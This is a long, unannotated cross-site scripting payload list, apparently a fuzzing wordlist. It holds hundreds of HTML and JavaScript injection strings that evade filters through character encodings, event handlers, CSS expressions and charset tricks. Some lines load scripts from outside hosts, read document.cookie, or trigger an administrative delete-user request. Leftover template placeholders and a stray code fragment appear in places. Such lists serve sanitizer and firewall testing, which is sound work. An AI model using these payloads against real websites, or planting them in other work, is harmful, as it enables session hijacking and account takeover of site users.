"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
<script\x2F>javascript:alert(1)</script>
<script\x20>javascript:alert(1)</script>
<script\x0D>javascript:alert(1)</script>
<script\x0A>javascript:alert(1)</script>
<script\x0C>javascript:alert(1)</script>
<script\x00>javascript:alert(1)</script>
<script\x09>javascript:alert(1)</script>
`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
<script>javascript:alert(1)<\x00/script>
<img src=# onerror\x3D"javascript:alert(1)" >
<input onfocus=javascript:alert(1) autofocus>
<input onblur=javascript:alert(1) autofocus><input autofocus>
<video poster=javascript:javascript:alert(1)//
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
<video><source onerror="javascript:javascript:alert(1)">
<video onerror="javascript:javascript:alert(1)"><source>
<form><button formaction="javascript:javascript:alert(1)">X
<body oninput=javascript:alert(1)><input autofocus>
<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
<frameset onload=javascript:alert(1)>
<table background="javascript:javascript:alert(1)">
<!--<img src="--><img src=x onerror=javascript:alert(1)//">
<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
<![><img src="]><img src=x onerror=javascript:alert(1)//">
<style><img src="</style><img src=x onerror=javascript:alert(1)//">
<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
<object data="data:text/html;base64,%(base64)s">
<embed src="data:text/html;base64,%(base64)s">
<b <script>alert(1)</script>0
<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
<? foo="><script>javascript:alert(1)</script>">
<! foo="><script>javascript:alert(1)</script>">
</ foo="><script>javascript:alert(1)</script>">
<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
<% foo><x foo="%><script>javascript:alert(1)</script>">
<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
<img \x00src=x onerror="alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x11src=x onerror="javascript:alert(1)">
<img \x12src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x10src=x onerror="javascript:alert(1)">
<img\x13src=x onerror="javascript:alert(1)">
<img\x32src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x11src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x34src=x onerror="javascript:alert(1)">
<img \x39src=x onerror="javascript:alert(1)">
<img \x00src=x onerror="javascript:alert(1)">
<img src\x09=x onerror="javascript:alert(1)">
<img src\x10=x onerror="javascript:alert(1)">
<img src\x13=x onerror="javascript:alert(1)">
<img src\x32=x onerror="javascript:alert(1)">
<img src\x12=x onerror="javascript:alert(1)">
<img src\x11=x onerror="javascript:alert(1)">
<img src\x00=x onerror="javascript:alert(1)">
<img src\x47=x onerror="javascript:alert(1)">
<img src=x\x09onerror="javascript:alert(1)">
<img src=x\x10onerror="javascript:alert(1)">
<img src=x\x11onerror="javascript:alert(1)">
<img src=x\x12onerror="javascript:alert(1)">
<img src=x\x13onerror="javascript:alert(1)">
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<img src=x onerror=\x09"javascript:alert(1)">
<img src=x onerror=\x10"javascript:alert(1)">
<img src=x onerror=\x11"javascript:alert(1)">
<img src=x onerror=\x12"javascript:alert(1)">
<img src=x onerror=\x32"javascript:alert(1)">
<img src=x onerror=\x00"javascript:alert(1)">
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<img src="x` `<script>javascript:alert(1)</script>"` `>
<img src onerror /" '"= alt=javascript:alert(1)//">
<title onpropertychange=javascript:alert(1)></title><title title=>
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
<!--[if]><script>javascript:alert(1)</script -->
<!--[if<img src=x onerror=javascript:alert(1)//]> -->
<script src="/\%(jscript)s"></script>
<script src="\\%(jscript)s"></script>
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
<style>*[{}@import'%(css)s?]</style>X
<div style="font-family:'foo&#10;;color:red;';">XXX
<div style="font-family:foo}color=red;">XXX
<// style=x:expression\28javascript:alert(1)\29>
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
<div style=content:url(%(svg)s)></div>
<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
<x style="background:url('x&#1;;color:red;/*')">XXX</x>
<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
<x style="behavior:url(%(sct)s)">
<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
<event-source src="%(event)s" onload="javascript:alert(1)">
<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">
<script>%(payload)s</script>
<script src=%(jscript)s></script>
<script language='javascript' src='%(jscript)s'></script>
<script>javascript:alert(1)</script>
<IMG SRC="javascript:javascript:alert(1);">
<IMG SRC=javascript:javascript:alert(1)>
<IMG SRC=`javascript:javascript:alert(1)`>
<SCRIPT SRC=%(jscript)s?<B>
<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
<BODY ONLOAD=javascript:alert(1)>
<BODY ONLOAD=javascript:javascript:alert(1)>
<IMG SRC="jav    ascript:javascript:alert(1);">
<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
<SCRIPT/SRC="%(jscript)s"></SCRIPT>
<<SCRIPT>%(payload)s//<</SCRIPT>
<IMG SRC="javascript:javascript:alert(1)"
<iframe src=%(scriptlet)s <
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
<IMG DYNSRC="javascript:javascript:alert(1)">
<IMG LOWSRC="javascript:javascript:alert(1)">
<BGSOUND SRC="javascript:javascript:alert(1);">
<BR SIZE="&{javascript:alert(1)}">
<LAYER SRC="%(scriptlet)s"></LAYER>
<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
<STYLE>@import'%(css)s';</STYLE>
<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
<XSS STYLE="behavior: url(%(htc)s);">
<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
<TABLE BACKGROUND="javascript:javascript:alert(1)">
<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
<DIV STYLE="width:expression(javascript:alert(1));">
<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
<XSS STYLE="xss:expression(javascript:alert(1))">
<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
<BASE HREF="javascript:javascript:alert(1);//">
<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
<SCRIPT SRC="%(jpg)s"></SCRIPT>
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
<STYLE>@import'%(css)s';</STYLE>
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
<style onreadystatechange=javascript:javascript:alert(1);></style>
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
<embed code=%(scriptlet)s></embed>
<embed code=javascript:javascript:alert(1);></embed>
<embed src=%(jscript)s></embed>
<frameset onload=javascript:javascript:alert(1)></frameset>
<object onerror=javascript:javascript:alert(1)>
<embed type="image" src=%(scriptlet)s></embed>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
<IMG SRC=&{javascript:alert(1);};>
<a href="jav&#65ascript:javascript:alert(1)">test1</a>
<a href="jav&#97ascript:javascript:alert(1)">test1</a>
<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="livescript:[code]">
<BODY ONLOAD=alert('XSS')>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<BASE HREF="javascript:alert('XSS');//">
 <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<img/src=`%00` onerror=this.onerror=confirm(1) 
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
http://www.google<script .com>alert(document.location)</script
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<script ^__^>alert(String.fromCharCode(49))</script ^__^
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<script ~~~>alert(0%0)</script ~~~>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<var onmouseover="prompt(1)">On Mouse Over</var>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<svg><script ?>alert(1)
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<svg contentScriptType=text/vbs><script>MsgBox+1
